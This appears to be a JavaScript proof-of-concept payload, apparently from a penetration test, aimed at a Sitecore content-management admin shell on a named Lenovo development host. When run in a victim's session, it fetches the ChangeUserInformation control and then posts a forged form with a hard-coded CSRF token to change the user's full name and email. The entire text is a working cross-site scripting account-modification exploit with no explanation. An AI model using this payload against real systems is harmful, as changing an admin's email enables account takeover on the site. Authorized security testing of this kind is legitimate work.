var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=351&__Y=573&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3ZWY0MmJkYS0wY2QzLTQzN2YtYWI0OC0yMDExN2VlZmYxZDQL&__VIEWSTATE=87BA08D6C2F74B3B9F6BA5C6E3156921&__VIEWSTATE=&Fullname=dxpPentestXSPOC&Email=lr%40moc.moc')
};
